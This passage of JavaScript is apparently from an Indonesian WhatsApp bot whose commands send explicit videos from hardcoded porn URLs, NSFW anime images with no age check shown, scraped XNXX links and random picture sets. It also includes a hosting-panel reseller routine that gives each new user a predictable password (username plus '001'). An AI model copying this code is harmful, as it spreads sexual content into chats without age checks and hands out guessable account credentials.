          `https://sfmcompile.club/wp-content/uploads/2023/02/Callie-working-in-Hooters.mp4`
        );
        Kilianhst.sendMessage(from, {
          video: ntahlah8,
          mimetype: "video/mp4",
          caption: `Sange Gak Sih 😋`,
        }).catch(console.error);
        break;
      case "bokep9":
        if (!isCreator && !isPrem) return reply(`OnlyPremium`);
        let ntahlah9 = await getBuffer(
          `https://sfmcompile.club/wp-content/uploads/2023/02/Harley-Quinn-in-GCPD-cell.mp4`
        );
        Kilianhst.sendMessage(from, {
          video: ntahlah9,
          mimetype: "video/mp4",
          caption: `Sange Gak Sih 😋`,
        }).catch(console.error);
        break;
      case "bokep10":
        if (!isCreator && !isPrem) return reply(`OnlyPremium`);
        let ntahlah10 = await getBuffer(
          `https://www.pornhub.com/view_video.php?viewkey=ph62dacb17ee77a`
        );
        Kilianhst.sendMessage(from, {
          video: ntahlah10,
          mimetype: "video/mp4",
          caption: `Sange Gak Sih 😋`,
        }).catch(console.error);
        break;
      case "bokep11":
        if (!isCreator && !isPrem) return reply(`OnlyPremium`);
        let ntahlah11 = await getBuffer(
          `https://sfmcompile.club/wp-content/uploads/2023/02/Harley-Quinn-in-GCPD-cell-With-makeup.mp4`
        );
        Kilianhst.sendMessage(from, {
          video: ntahlah11,
          mimetype: "video/mp4",
          caption: `Sange Gak Sih 😋`,
        }).catch(console.error);
        break;
      case "bokep12":
        if (!isCreator && !isPrem) return reply(`OnlyPremium`);
        let ntahlah12 = await getBuffer(
          `https://sfmcompile.club/wp-content/uploads/2023/02/Harley-Quinn-in-GCPD-cell-With-makeup.mp4`
        );
        Kilianhst.sendMessage(from, {
          video: ntahlah12,
          mimetype: "video/mp4",
          caption: `Sange Gak Sih 😋`,
        }).catch(console.error);
        break;
      case "bokep13":
        if (!isCreator && !isPrem) return reply(`OnlyPremium`);
        let ntahlah13 = await getBuffer(
          `https://sfmcompile.club/wp-content/uploads/2023/02/Harley-Quinn-in-GCPD-cell.mp4`
        );
        Kilianhst.sendMessage(from, {
          video: ntahlah13,
          mimetype: "video/mp4",
          caption: `Sange Gak Sih 😋`,
        }).catch(console.error);
        break;
      case "bokep14":
        if (!isCreator && !isPrem) return reply(`OnlyPremium`);
        //if (!isGroup) return onlyGroup()
        let ntahlah14 = await getBuffer(
          `https://sfmcompile.club/wp-content/uploads/2023/02/Callie-working-in-Hooters.mp4`
        );
        Kilianhst.sendMessage(from, {
          video: ntahlah14,
          mimetype: "video/mp4",
          caption: `Sange Gak Sih 😋`,
        }).catch(console.error);
        break;
      case "bokep15":
        if (!isCreator && !isPrem) return reply(`OnlyPremium`);
        //if (!isGroup) return onlyGroup()
        let ntahlah15 = await getBuffer(
          `https://sfmcompile.club/wp-content/uploads/2023/02/Siona-taking-it-deep.mp4`
        );
        Kilianhst.sendMessage(from, {
          video: ntahlah15,
          mimetype: "video/mp4",
          caption: `Sange Gak Sih 😋`,
        }).catch(console.error);
        break;
      case "bokep16":
        if (!isCreator && !isPrem) return reply(`OnlyPremium`);
        //if (!isGroup) return onlyGroup()
        let ntahlah16 = await getBuffer(
          `https://sfmcompile.club/wp-content/uploads/2023/02/Ballerina-bot-facial.mp4`
        );
        Kilianhst.sendMessage(from, {
          video: ntahlah16,
          mimetype: "video/mp4",
          caption: `Sange Gak Sih 😋`,
        }).catch(console.error);
        break;
      case "bokep17":
        if (!isCreator && !isPrem) return reply(`OnlyPremium`);
        //if (!isGroup) return onlyGroup()
        let ntahlah17 = await getBuffer(
          `https://sfmcompile.club/wp-content/uploads/2023/02/Nyotengu-riding-with-help.mp4`
        );
        Kilianhst.sendMessage(from, {
          video: ntahlah17,
          mimetype: "video/mp4",
          caption: `Sange Gak Sih 😋`,
        }).catch(console.error);
        break;
      case "bokep18":
        if (!isCreator && !isPrem) return reply(`OnlyPremium`);
        //if (!isGroup) return onlyGroup()
        let ntahlah18 = await getBuffer(
          `https://sfmcompile.club/wp-content/uploads/2023/02/2B-outdoor-reverse-cowgirl-Sound-update.mp4`
        );
        Kilianhst.sendMessage(from, {
          video: ntahlah18,
          mimetype: "video/mp4",
          caption: `Sange Gak Sih 😋`,
        }).catch(console.error);
        break;
      case "waifunsfw":
        {
          if (!isRegistered)
            return daftar(
              "*[ !! ]*\nᴋᴀᴍᴜ ʙᴇʟᴜᴍ ᴛᴇʀᴅᴀғᴛᴀʀ sɪʟᴀʜᴋᴀɴ ᴅᴀғᴛᴀʀ ᴅᴇɴɢᴀɴ ᴄᴀʀᴀ ᴋᴇᴛɪᴋ .ᴅᴀғᴛᴀʀ nama,umur"
            );
          try {
            let res = await fetch("https://api.waifu.pics/nsfw/waifu");
            let json = await res.json();
            Kilianhst.sendMessage(
              m.chat,
              { image: { url: json.url }, caption: `NSFW Waifu` },
              { quoted: m }
            );
          } catch (e) {
            reply("Gagal Mengambil Gambar");
          }
        }
        break;
      case "xnxxdownload":
        {
          if (!text)
            return m.reply("⚠️ Masukkan URL Video XNXX untuk di-download!");
          try {
            await Kilianhst.sendMessage(m.chat, {
              react: { text: "🔎", key: m.key },
            });

            // Ambil URL video yang diminta
            let url = text;
            let res = await axios.get(url);
            let $ = cheerio.load(res.data);

            // Cari link video dengan selector yang sesuai
            let videoUrl = $("video").attr("src"); // Biasanya ada di tag <video> dengan attribute 'src'
            if (!videoUrl) return m.reply("❌ Video Tidak Ditemukan!");

            // Kirim link download video
            await Kilianhst.sendMessage(
              m.chat,
              {
                text: `🔗 *Link Download Video:* ${videoUrl}`,
                footer: "Klik untuk menonton video",
                templateButtons: [
                  {
                    urlButton: {
                      displayText: "Download Video",
                      url: videoUrl,
                    },
                  },
                ],
              },
              { quoted: m }
            );
          } catch (e) {
            console.log(e);
            return m.reply("❌ Terjadi Kesalahan Saat Mengambil Data Video.");
          }
        }
        break;
      /* 
𝗕𝗔𝗧𝗔𝗦 𝗖𝗔𝗦𝗘 𝗧𝗘𝗠𝗣𝗔𝗧 𝗕𝗢𝗞𝗘𝗣 𝗠𝗘𝗡𝗨
𝗕𝗬 𝗞𝗬𝗬𝗫𝗗
𝗔𝗞𝗔𝗠𝗘 𝗔𝗜
*/

      //============================================================\\
      //  𝗔 𝗦 𝗨 𝗣 𝗔 𝗡    -         𝗠 𝗘 𝗡 𝗨
      //============================================================\\
      case "tiktokgirl":
        var asupan = JSON.parse(
          fs.readFileSync("./system/tiktokvids/tiktokgirl.json")
        );
        var ii = pickRandom(asupan);
        Kilianhst.sendMessage(
          m.chat,
          { caption: mess.success, video: { url: ii.url } },
          { quoted: m }
        );
        break;
      case "tiktokghea":
        var gheayubi = JSON.parse(
          fs.readFileSync("./system/tiktokvids/gheayubi.json")
        );
        var iii = pickRandom(gheayubi);
        Kilianhst.sendMessage(
          m.chat,
          { caption: mess.success, video: { url: iii.url } },
          { quoted: m }
        );
        break;
      case "tiktokbocil":
        var bocil = JSON.parse(
          fs.readFileSync("./system/tiktokvids/bocil.json")
        );
        var iiii = pickRandom(bocil);
        Kilianhst.sendMessage(
          m.chat,
          { caption: mess.success, video: { url: iiii.url } },
          { quoted: m }
        );
        break;
      case "tiktoknukhty":
        var ukhty = JSON.parse(
          fs.readFileSync("./system/tiktokvids/ukhty.json")
        );
        var iiiii = pickRandom(ukhty);
        Kilianhst.sendMessage(
          m.chat,
          { caption: mess.success, video: { url: iiiii.url } },
          { quoted: m }
        );
        break;
      case "tiktoksantuy":
        var santuy = JSON.parse(
          fs.readFileSync("./system/tiktokvids/santuy.json")
        );
        var iiiiii = pickRandom(santuy);
        Kilianhst.sendMessage(
          m.chat,
          { caption: mess.success, video: { url: iiiiii.url } },
          { quoted: m }
        );
        break;
      case "tiktokkayes":
        var kayes = JSON.parse(
          fs.readFileSync("./system/tiktokvids/kayes.json")
        );
        var iiiiiii = pickRandom(kayes);
        Kilianhst.sendMessage(
          m.chat,
          { caption: mess.success, video: { url: iiiiiii.url } },
          { quoted: m }
        );
        break;
      case "tiktokpanrika":
        var rikagusriani = JSON.parse(
          fs.readFileSync("./system/tiktokvids/panrika.json")
        );
        var iiiiiiii = pickRandom(rikagusriani);
        Kilianhst.sendMessage(
          m.chat,
          { caption: mess.success, video: { url: iiiiiiii.url } },
          { quoted: m }
        );
        break;
      case "tiktoknotnot":
        var notnot = JSON.parse(
          fs.readFileSync("./system/tiktokvids/notnot.json")
        );
        var iiiiiiiii = pickRandom(notnot);
        Kilianhst.sendMessage(
          m.chat,
          { caption: mess.success, video: { url: iiiiiiiii.url } },
          { quoted: m }
        );
        break;
      case "chinese":
        indo;
        var notnot = JSON.parse(
          fs.readFileSync("./system/tiktokpics/china.json")
        );
        var iiiiiiiiii = pickRandom(notnot);
        Kilianhst.sendMessage(
          m.chat,
          { caption: mess.success, image: { url: iiiiiiiiii.url } },
          { quoted: m }
        );
        break;
      case "hijab":
        var notnot = JSON.parse(
          fs.readFileSync("./system/tiktokpics/hijab.json")
        );
        var iiiiiiiiiii = pickRandom(notnot);
        Kilianhst.sendMessage(
          m.chat,
          { caption: mess.success, image: { url: iiiiiiiiiii.url } },
          { quoted: m }
        );
        break;
      case "indo":
        var notnot = JSON.parse(
          fs.readFileSync("./system/tiktokpics/indonesia.json")
        );
        var iiiiiiiiiiii = pickRandom(notnot);
        Kilianhst.sendMessage(
          m.chat,
          { caption: mess.success, image: { url: iiiiiiiiiiii.url } },
          { quoted: m }
        );
        break;
      case "japanese":
        var notnot = JSON.parse(
          fs.readFileSync("./system/tiktokpics/japan.json")
        );
        var iiiiiiiiiiiii = pickRandom(notnot);
        Kilianhst.sendMessage(
          m.chat,
          { caption: mess.success, image: { url: iiiiiiiiiiiii.url } },
          { quoted: m }
        );
        break;
      case "korean":
        var notnot = JSON.parse(
          fs.readFileSync("./system/tiktokpics/korea.json")
        );
        var iiiiiiiiiiiiii = pickRandom(notnot);
        Kilianhst.sendMessage(
          m.chat,
          { caption: mess.success, image: { url: iiiiiiiiiiiiii.url } },
          { quoted: m }
        );
        break;
      case "malay":
        var notnot = JSON.parse(
          fs.readFileSync("./system/tiktokpics/malaysia.json")
        );
        var iiiiiiiiiiiiiii = pickRandom(notnot);
        Kilianhst.sendMessage(
          m.chat,
          { caption: mess.success, image: { url: iiiiiiiiiiiiiii.url } },
          { quoted: m }
        );
        break;
      case "randomgirl":
        var notnot = JSON.parse(
          fs.readFileSync("./system/tiktokpics/random.json")
        );
        var iiiiiiiiiiiiiiii = pickRandom(notnot);
        Kilianhst.sendMessage(
          m.chat,
          { caption: mess.success, image: { url: iiiiiiiiiiiiiiii.url } },
          { quoted: m }
        );
        break;
      case "randomboy":
        var notnot = JSON.parse(
          fs.readFileSync("./system/tiktokpics/random2.json")
        );
        var iiiiiiiiiiiiiiiii = pickRandom(notnot);
        Kilianhst.sendMessage(
          m.chat,
          { caption: mess.success, image: { url: iiiiiiiiiiiiiiiii.url } },
          { quoted: m }
        );
        break;
      case "thai":
        var notnot = JSON.parse(
          fs.readFileSync("./system/tiktokpics/thailand.json")
        );
        var iiiiiiiiiiiiiiiiii = pickRandom(notnot);
        Kilianhst.sendMessage(
          m.chat,
          { caption: mess.success, image: { url: iiiiiiiiiiiiiiiiii.url } },
          { quoted: m }
        );
        break;
      case "vietnamese":
        var notnot = JSON.parse(
          fs.readFileSync("./system/tiktokpics/vietnam.json")
        );
        var iiiiiiiiiiiiiiiiiii = pickRandom(notnot);
        Kilianhst.sendMessage(
          m.chat,
          { caption: mess.success, image: { url: iiiiiiiiiiiiiiiiiii.url } },
          { quoted: m }
        );
        break;
      case "aesthetic":
        reply("Wet ngabs");
        var notnot = JSON.parse(
          fs.readFileSync("./system/randompics/aesthetic.json")
        );
        var iiiiiiiiiiiiiiiiiiii = pickRandom(notnot);
        Kilianhst.sendMessage(
          m.chat,
          { caption: "don banh", image: { url: iiiiiiiiiiiiiiiiiiii.url } },
          { quoted: m }
        );
        break;
      case "antiwork":
        reply("Wet ngabs");
        var notnot = JSON.parse(
          fs.readFileSync("./system/resource/randompics/antiwork.json")
        );
        var iiiiiiiiiiiiiiiiiiiii = pickRandom(notnot);
        Kilianhst.sendMessage(
          m.chat,
          { caption: "don banh", image: { url: iiiiiiiiiiiiiiiiiiiii.url } },
          { quoted: m }
        );
        break;
      case "blackpink2":
        reply("Wet ngabs");
        var notnot = JSON.parse(
          fs.readFileSync("./system/resource/randompics/blackpink.json")
        );
        var iiiiiiiiiiiiiiiiiiiiii = pickRandom(notnot);
        Kilianhst.sendMessage(
          m.chat,
          { caption: "don banh", image: { url: iiiiiiiiiiiiiiiiiiiiii.url } },
          { quoted: m }
        );
        break;
      case "bike":
        reply("Wet ngabs");
        var notnot = JSON.parse(
          fs.readFileSync("./system/resource/randompics/bike.json")
        );
        var iiiiiiiiiiiiiiiiiiiiiii = pickRandom(notnot);
        Kilianhst.sendMessage(
          m.chat,
          { caption: "don banh", image: { url: iiiiiiiiiiiiiiiiiiiiiii.url } },
          { quoted: m }
        );
        break;
      case "boneka":
        reply("Wet ngabs");
        var notnot = JSON.parse(
          fs.readFileSync("./system/resource/randompics/boneka.json")
        );
        var iiiiiiiiiiiiiiiiiiiiiiii = pickRandom(notnot);
        Kilianhst.sendMessage(
          m.chat,
          { caption: "don banh", image: { url: iiiiiiiiiiiiiiiiiiiiiiii.url } },
          { quoted: m }
        );
        break;
      case "cosplay":
        reply("Wet ngabs");
        var notnot = JSON.parse(
          fs.readFileSync("./resource/randompics/cosplay.json")
        );
        var iiiiiiiiiiiiiiiiiiiiiiiii = pickRandom(notnot);
        Kilianhst.sendMessage(
          m.chat,
          {
            caption: "don banh",
            image: { url: iiiiiiiiiiiiiiiiiiiiiiiii.url },
          },
          { quoted: m }
        );
        break;
      case "cat":
        reply("Wet ngabs");
        var notnot = JSON.parse(
          fs.readFileSync("./system/resource/randompics/cat.json")
        );
        var iiiiiiiiiiiiiiiiiiiiiiiiii = pickRandom(notnot);
        Kilianhst.sendMessage(
          m.chat,
          {
            caption: "don banh",
            image: { url: iiiiiiiiiiiiiiiiiiiiiiiiii.url },
          },
          { quoted: m }
        );
        break;
      case "doggo":
        reply("Wet ngabs");
        var notnot = JSON.parse(
          fs.readFileSync("./system/resource/randompics/doggo.json")
        );
        var iiiiiiiiiiiiiiiiiiiiiiiiiil = pickRandom(notnot);
        Kilianhst.sendMessage(
          m.chat,
          {
            caption: "don banh",
            image: { url: iiiiiiiiiiiiiiiiiiiiiiiiiil.url },
          },
          { quoted: m }
        );
        break;
      case "justina":
        reply("Wet ngabs");
        var notnot = JSON.parse(
          fs.readFileSync("./system/resource/randompics/justina.json")
        );
        var iiiiiiiiiiiiiiiiiiiiiiiiiill = pickRandom(notnot);
        Kilianhst.sendMessage(
          m.chat,
          {
            caption: "don banh",
            image: { url: iiiiiiiiiiiiiiiiiiiiiiiiiill.url },
          },
          { quoted: m }
        );
        break;

      case "kayes":
        reply("Wet ngabs");
        var notnot = JSON.parse(
          fs.readFileSync("./system/resource/randompics/kayes.json")
        );
        var iiiiiiiiiiiiiiiiiiiiiiiiiilll = pickRandom(notnot);
        Kilianhst.sendMessage(
          m.chat,
          {
            caption: "don banh",
            image: { url: iiiiiiiiiiiiiiiiiiiiiiiiiilll.url },
          },
          { quoted: m }
        );
        break;
      case "kpop":
        reply("Wet ngabs");
        var notnot = JSON.parse(
          fs.readFileSync("./system/resource/randompics/kpop.json")
        );
        var ll = pickRandom(notnot);
        Kilianhst.sendMessage(
          m.chat,
          { caption: "don banh", image: { url: ll.url } },
          { quoted: m }
        );
        break;
      case "notnot":
        reply("Wet ngabs");
        var notnot = JSON.parse(
          fs.readFileSync("./system/resource/randompics/notnot.json")
        );
        var lll = pickRandom(notnot);
        Kilianhst.sendMessage(
          m.chat,
          { caption: "don banh", image: { url: lll.url } },
          { quoted: m }
        );
        break;
      case "car":
        reply("Wet ngabs");
        var notnot = JSON.parse(
          fs.readFileSync("./system/resource/randompics/car.json")
        );
        var llll = pickRandom(notnot);
        Kilianhst.sendMessage(
          m.chat,
          { caption: "don banh", image: { url: llll.url } },
          { quoted: m }
        );
        break;
      case "couplepic":
      case "couplepicture":
        reply("Wet ngabs");
        var notnot = JSON.parse(
          fs.readFileSync("./system/resource/randompics/ppcouple.json")
        );
        var lllll = pickRandom(notnot);
        Kilianhst.sendMessage(
          m.chat,
          { caption: "don banh", image: { url: lllll.url } },
          { quoted: m }
        );
        break;
      case "profilepic":
      case "profilepicture":
        reply("Wet ngabs");
        var notnot = JSON.parse(
          fs.readFileSync("./system/resource/randompics/profile.json")
        );
        var llllll = pickRandom(notnot);
        Kilianhst.sendMessage(
          m.chat,
          { caption: "don banh", image: { url: llllll.url } },
          { quoted: m }
        );
        break;
      case "pubg":
        reply("Wet ngabs");
        var notnot = JSON.parse(
          fs.readFileSync("./system/resource/randompics/pubg.json")
        );
        var lllllll = pickRandom(notnot);
        Kilianhst.sendMessage(
          m.chat,
          { caption: "don banh", image: { url: lllllll.url } },
          { quoted: m }
        );
        break;
      case "rose":
        reply("Wet ngabs");
        var notnot = JSON.parse(
          fs.readFileSync("./system/resource/randompics/rose.json")
        );
        var llllllll = pickRandom(notnot);
        Kilianhst.sendMessage(
          m.chat,
          { caption: "don banh", image: { url: llllllll.url } },
          { quoted: m }
        );
        break;
      case "ryujin":
        reply("Wet ngabs");
        var notnot = JSON.parse(
          fs.readFileSync("./system/resource/randompics/ryujin.json")
        );
        var lllllllll = pickRandom(notnot);
        Kilianhst.sendMessage(
          m.chat,
          { caption: "don banh", image: { url: lllllllll.url } },
          { quoted: m }
        );
        break;
      case "ulzzangboy":
        reply("Wet ngabs");
        var notnot = JSON.parse(
          fs.readFileSync("./system/resource/randompics/ulzzangboy.json")
        );
        var llllllllll = pickRandom(notnot);
        Kilianhst.sendMessage(
          m.chat,
          { caption: "don banh", image: { url: llllllllll.url } },
          { quoted: m }
        );
        break;
      case "ulzzanggirl":
        reply("Wet ngabs");
        var notnot = JSON.parse(
          fs.readFileSync("./system/resource/randompics/ulzzanggirl.json")
        );
        var lllllllllll = pickRandom(notnot);
        Kilianhst.sendMessage(
          m.chat,
          { caption: "don banh", image: { url: lllllllllll.url } },
          { quoted: m }
        );
        break;
      case "wallml":
      case "wallpaperml":
      case "mobilelegend":
        reply("Wet ngabs");
        var notnot = JSON.parse(
          fs.readFileSync("./system/resource/randompics/wallml.json")
        );
        var llllllllllll = pickRandom(notnot);
        Kilianhst.sendMessage(
          m.chat,
          { caption: "don banh", image: { url: llllllllllll.url } },
          { quoted: m }
        );
        break;
      case "wallpaperphone":
      case "wallphone":
        reply("Wet ngabs");
        var notnot = JSON.parse(
          fs.readFileSync("./system/resource/randompics/wallhp.json")
        );
        var lllllllllllll = pickRandom(notnot);
        Kilianhst.sendMessage(
          m.chat,
          { caption: "don banh", image: { url: lllllllllllll.url } },
          { quoted: m }
        );
        break;

      case "hentai-neko":
      case "hentai":
      case "hneko":
        let waifudd2 = await axios.get(`https://waifu.pics/api/nsfw/neko`);
        Kilianhst.sendMessage(
          m.chat,
          { caption: "Berhasil 🍏", image: { url: waifudd2.data.url } },
          { quoted: m }
        );
        break;
      case "hentai-waifu":
      case "nwaifu":
        await Kilianhst.sendMessage(m.chat, {
          react: { text: "🥵", key: m.key },
        });
        let waifudd3 = await axios.get(`https://waifu.pics/api/nsfw/waifu`);
        Kilianhst.sendMessage(
          m.chat,
          { caption: "Berhasil 🍏", image: { url: waifudd3.data.url } },
          { quoted: m }
        );
        break;
      case "gasm":
        await Kilianhst.sendMessage(m.chat, {
          react: { text: "🥵", key: m.key },
        });
        let waifudd4 = await axios.get(
          `https://nekos.life/api/v2/img/${command}`
        );
        Kilianhst.sendMessage(
          m.chat,
          { caption: "Berhasil 🍏", image: { url: waifudd4.data.url } },
          { quoted: m }
        );
        break;
      case "milf":
        await Kilianhst.sendMessage(m.chat, {
          react: { text: "🥵", key: m.key },
        });
        var ahegaonsfw = JSON.parse(
          fs.readFileSync("./system/resource/nsfw/milf.json")
        );
        var kymyresult = pickRandom(ahegaonsfw);
        Kilianhst.sendMessage(
          m.chat,
          { caption: "Berhasil 🍏", image: { url: kymyresult.url } },
          { quoted: m }
        );
        break;
      case "animespank":
        let waifudd5 = await await axios.get(
          `https://nekos.life/api/v2/img/spank`
        );
        Kilianhst.sendMessage(
          m.chat,
          { caption: `Here you go!`, image: { url: waifudd5.data.url } },
          { quoted: m }
        ).catch((err) => {
          return "Error!";
        });
        break;
      /* 
𝗕𝗔𝗧𝗔𝗦 𝗖𝗔𝗦𝗘 𝗧𝗘𝗠𝗣𝗔𝗧 𝗔𝗦𝗨𝗣𝗔𝗡 𝗠𝗘𝗡𝗨
𝗕𝗬 𝗞𝗬𝗬𝗫𝗗
𝗔𝗞𝗔𝗠𝗘 𝗔𝗜
*/

      //============================================================\\
      //  𝗖 𝗣 𝗔 𝗡 𝗘 𝗟   -         𝗠 𝗘 𝗡 𝗨
      //============================================================\\
      case "1gb":
      case "2gb":
      case "3gb":
      case "4gb":
      case "5gb":
      case "6gb":
      case "7gb":
      case "8gb":
      case "9gb":
      case "10gb":
      case "unlimited":
      case "unli":
        {
          if (!isCreator && !isPrem) {
            return m.reply(
              `Fitur ini hanya untuk dalam grup *reseller panel*!\nJoin grup *reseller panel* langsung chat ${global.owner}`
            );
          }
          if (!text) return example("username,628XXX");

          let nomor, usernem;
          let tek = text.split(",");
          if (tek.length > 1) {
            let [users, nom] = tek.map((t) => t.trim());
            if (!users || !nom) return example("username,628XXX");
            nomor = nom.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
            usernem = users.toLowerCase();
          } else {
            usernem = text.toLowerCase();
            nomor = m.isGroup ? m.sender : m.chat;
          }

          try {
            var onWa = await Kilianhst.onWhatsApp(nomor.split("@")[0]);
            if (onWa.length < 1)
              return m.reply("Nomor target tidak terdaftar di WhatsApp!");
          } catch (err) {
            console.error("WhatsApp Error:", err);
            return m.reply(
              "Terjadi kesalahan saat mengecek nomor WhatsApp: " + err.message
            );
          }

          // Mapping RAM, Disk, dan CPU
          const resourceMap = {
            "1gb": { ram: "1000", disk: "1000", cpu: "40" },
            "2gb": { ram: "2000", disk: "1000", cpu: "60" },
            "3gb": { ram: "3000", disk: "2000", cpu: "80" },
            "4gb": { ram: "4000", disk: "2000", cpu: "100" },
            "5gb": { ram: "5000", disk: "3000", cpu: "120" },
            "6gb": { ram: "6000", disk: "3000", cpu: "140" },
            "7gb": { ram: "7000", disk: "4000", cpu: "160" },
            "8gb": { ram: "8000", disk: "4000", cpu: "180" },
            "9gb": { ram: "9000", disk: "5000", cpu: "200" },
            "10gb": { ram: "10000", disk: "5000", cpu: "220" },
            unlimited: { ram: "0", disk: "0", cpu: "0" },
          };

          let { ram, disk, cpu } = resourceMap[command] || {
            ram: "0",
            disk: "0",
            cpu: "0",
          };

          let username = usernem.toLowerCase();
          let email = username + "@gmail.com";
          let name = capital(username) + " Server";
          let password = username + "001";

          try {
            let f = await fetch(domain + "/api/application/users", {
              method: "POST",
              headers: {
                Accept: "application/json",
                "Content-Type": "application/json",
                Authorization: "Bearer " + apikey,
              },
              body: JSON.stringify({
                email,
                username,
                first_name: name,
                last_name: "Server",
                language: "en",
                password,
              }),
            });

            let data = await f.json();
            if (data.errors)
              return m.reply(
                "Error: " + JSON.stringify(data.errors[0], null, 2)
              );
            let user = data.attributes;

            let f1 = await fetch(
              domain + `/api/application/nests/${nestid}/eggs/` + egg,
              {
                method: "GET",
                headers: {
                  Accept: "application/json",
                  "Content-Type": "application/json",
                  Authorization: "Bearer " + apikey,
                },
              }
            );

            let data2 = await f1.json();
            let startup_cmd = data2.attributes.startup;

            let f2 = await fetch(domain + "/api/application/servers", {
              method: "POST",
              headers: {
                Accept: "application/json",
                "Content-Type": "application/json",
                Authorization: "Bearer " + apikey,
              },
              body: JSON.stringify({
                name,
                description: tanggal(Date.now()),
                user: user.id,
                egg: parseInt(egg),
                docker_image: "ghcr.io/parkervcp/yolks:nodejs_20",
                startup: startup_cmd,
                environment: {
                  INST: "npm",
                  USER_UPLOAD: "0",
                  AUTO_UPDATE: "0",
                  CMD_RUN: "npm start",
                },
                limits: { memory: ram, swap: 0, disk, io: 500, cpu },
                feature_limits: { databases: 5, backups: 5, allocations: 5 },
                deploy: {
                  locations: [parseInt(loc)],
                  dedicated_ip: false,
                  port_range: [],
                },
              }),
            });

            let result = await f2.json();
            if (result.errors)
              return m.reply(
                "Error: " + JSON.stringify(result.errors[0], null, 2)
              );

            let server = result.attributes;
            var orang = nomor;
            if (m.isGroup) {
              await m.reply(
                `Berhasil membuat akun panel ✅\ndata akun sudah di kirim ke ${
                  nomor == m.sender ? "private chat" : nomor.split("@")[0]
                }`
              );
            }
            if (nomor !== m.sender && !m.isGroup) {
              await m.reply(
                `Berhasil membuat akun panel ✅\ndata akun sudah di kirim ke ${
                  nomor.split("@")[0]
                }`
              );
            }

            let teks = `
*Berikut Detail Akun Panel Kamu 📦*

*📡 ID Server (${server.id})* 
*👤 Username :* ${user.username}
*🔐 Password :* ${password}
*🗓️ ${tanggal(Date.now())}*

*🌐 Spesifikasi Server*
* Ram : *${ram == "0" ? "Unlimited" : ram / 1000 + "GB"}*
* Disk : *${disk == "0" ? "Unlimited" : disk / 1000 + "GB"}*
* CPU : *${cpu == "0" ? "Unlimited" : cpu + "%"}*
* ${global.domain}

*Syarat & Ketentuan :*
* Expired panel 1 bulan
* Simpan data ini sebaik mungkin
* Garansi pembelian 15 hari (1x replace)
* Claim garansi wajib membawa bukti chat pembelian
`;

            await Kilianhst.sendMessage(orang, { text: teks }, { quoted: m });
          } catch (err) {
            console.error("Terjadi kesalahan:", err);
            return m.reply("Terjadi kesalahan: " + err.message);
          }
        }
        break;

      /* 
𝗕𝗔𝗧𝗔𝗦 𝗖𝗔𝗦𝗘 𝗧𝗘𝗠𝗣𝗔𝗧 𝗖𝗣𝗔𝗡𝗘𝗟 𝗠𝗘𝗡𝗨
𝗕𝗬 𝗞𝗬𝗬𝗫𝗗
𝗔𝗞𝗔𝗠𝗘 𝗔𝗜
*/

      //============================================================\\
      //  𝗤 𝗨 𝗢 𝗧 𝗘 𝗦  -         𝗠 𝗘 𝗡 𝗨
      //============================================================\\
      case "quotesanime":
      case "quotesanim":
        {
          let res = await await fetch(
            "https://katanime.vercel.app/api/getrandom?limit=1"
          );
          if (!res.ok) return await res.text();
          let json = await res.json();
          if (!json.result[0]) return json;
          let { indo, character, anime } = json.result[0];
          reply(`${indo}\n\n📮By: ${character} \nAnime:\n${anime}`);
        }
        break;

      case "quotesbacot":
        {
          function pickRandom(list) {
            return list[Math.floor(list.length * Math.random())];
          }

          const bacot = [
            "Kamu suka kopi nggak? Aku sih suka. Tau kenapa alesannya? Kopi itu ibarat kamu, pahit sih tapi bikin candu jadi pingin terus.",
            "Gajian itu kayak mantan ya? Bisanya cuman lewat sebentar saja.",
            "Kata pak haji, cowok yang nggak mau pergi Sholat Jumat disuruh pakai rok aja.",
            "Kamu tahu mantan nggak? Mantan itu ibarat gajian, biasa numpang lewat dong di kehidupan kita.",
            "Aku suka kamu, kamu suka dia, tapi dia sayangnya nggak ke kamu. Wkwkw lucu ya? Cinta serumit ini.",
            "Google itu hebat ya? Tapi sayang sehebat-hebatnya Google nggak bisa menemukan jodoh kita.",
            "Terlalu sering memegang pensil alis dapat membuat mata menjadi buta, jika dicolok-colokkan ke mata.",
            "Saya bekerja keras karena sadar kalau uang nggak punya kaki buat jalan sendiri ke kantong saya.",
            "Jika kamu tak mampu meyakinkan dan memukau orang dengan kepintaranmu, bingungkan dia dengan kebodohanmu.",
            "Selelah-lelahnya bekerja, lebih lelah lagi kalau nganggur.",
            "Kita hidup di masa kalau salah kena marah, pas bener dibilang tumben.",
            "Nggak ada bahu pacar? Tenang aja, masih ada bahu jalan buat nyandar.",
            "Mencintai dirimu itu wajar, yang gak wajar mencintai bapakmu.",
            "Katanya enggak bisa bohong. Iyalah, mata kan cuma bisa melihat.",
            "Madu di tangan kananmu, racun di tangan kirimu, jodoh tetap di tangan tuhan.",
            "Selingkuh terjadi bukan karena ada niat, selingkuh terjadi karna pacar kamu masih laku.",
            "Netizen kalau senam jempol di ponsel nggak pakai pendinginan, pantes komennya bikin panas terus.",
            "Jodoh memang enggak kemana, tapi saingannya ada dimana-mana.",
            "Perasaan aku salah terus di matamu. Kalu gitu, besok aku pindah ke hidungmu.",
            "Jomblo tidak perlu malu, jomblo bukan berarti tidak laku, tapi memang tidak ada yang mau.",
            "Jika doamu belum terkabul maka bersabar, ingatlah bahwa yang berdoa bukan cuma kamu!",
            "Masih berharap dan terus berharap lama-lama aku jadi juara harapan.",
            "Manusia boleh berencana, tapi akhirnya saldo juga yang menentukan.",
            "Statusnya rohani, kelakuannya rohalus.",
            "Kegagalan bukan suatu keberhasilan.",
            "Tadi mau makan bakso, cuma kok panas banget, keliatannya baksonya lagi demam.",
            "Aku juga pernah kaya, waktu gajian.",
            "Aku diputusin sama pacar karena kita beda keyakinan. Aku yakin kalau aku ganteng, tapi dia enggak.",
            "Masa depanmu tergantung pada mimpimu, maka perbanyaklah tidur.",
            "Seberat apapun pekerjaanmu, akan semakin ringan jika tidak dibawa.",
            "Jangan terlalu berharap! nanti jatuhnya sakit!",
            "Ingat! Anda itu jomblo",
            "Gak tau mau ngetik apa",
          ];
          let bacotan = pickRandom(bacot);
          reply(bacotan);
        }
        break;
      //=========================================\\======

      case "quotesbucin":
        {
          const bucin = [
            "Aku memilih untuk sendiri, bukan karena menunggu yang sempurna, tetapi butuh yang tak pernah menyerah.",
            "Seorang yang single diciptakan bersama pasangan yang belum ditemukannya.",
            "Jomblo. Mungkin itu cara Tuhan untuk mengatakan 'Istirahatlah dari cinta yang salah'.",
            "Jomblo adalah anak muda yang mendahulukan pengembangan pribadinya untuk cinta yang lebih berkelas nantinya.",
